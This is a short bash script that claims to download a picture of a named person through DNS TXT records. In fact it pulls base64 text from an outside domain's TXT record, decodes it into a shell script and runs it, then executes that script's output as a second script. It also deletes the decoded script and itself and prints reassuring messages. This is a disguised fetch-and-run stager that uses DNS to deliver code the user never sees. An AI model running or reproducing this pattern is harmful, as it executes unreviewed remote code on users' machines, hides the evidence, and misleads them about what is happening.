#!/bin/bash
#####################################################################################
# Would you like to download a picture of Marcus Holtz? NOW YOU CAN!
# Using DNS txt records in Base64 you can download a picture.
#####################################################################################
dig +short TXT marcusInDNS.holtzweb.com @9.9.9.9 | tr -d '"' | tr -d "\n\r" | tr -d [:blank:] | base64 -d > showmethescript.sh; /bin/bash showmethescript.sh > showmemarcus.sh; rm showmethescript.sh; echo -e "\nEverything ran perfect."; sleep 1; echo -e "Now you have to wait for the photo\n"; sleep 2; chmod +x showmemarcus.sh; sleep 1; rm downloadmarcusholtz.sh 2>/dev/null; echo ""; /bin/bash showmemarcus.sh;
